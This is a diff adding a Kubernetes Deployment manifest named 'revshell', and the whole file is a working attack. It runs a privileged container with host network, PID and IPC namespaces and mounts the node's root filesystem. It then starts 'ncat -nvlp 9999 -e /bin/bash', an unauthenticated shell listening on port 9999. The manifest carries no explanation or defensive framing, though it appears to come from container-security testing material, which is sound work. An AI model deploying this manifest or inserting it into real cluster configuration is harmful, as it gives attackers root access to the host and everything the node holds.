@@ -1,0 +1,33 @@
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: revshell
+spec:
+  selector:
+    matchLabels: 
+      run: revshell
+  replicas: 1
+  template:
+    metadata:
+      labels:
+        run: revshell  
+    spec:
+      hostNetwork: true
+      hostPID: true
+      hostIPC: true
+      containers:
+      - name: revshell
+        image: raesene/ncat
+        command: [ "/bin/sh", "-c", "--" ]
+        args: [ "ncat -nvlp 9999 -e /bin/bash;" ]
+        ports:
+         - containerPort: 9999
+        securityContext:
+          privileged: true
+        volumeMounts:
+        - mountPath: /host
+          name: noderoot
+      volumes:
+      - name: noderoot
+        hostPath:
+          path: /
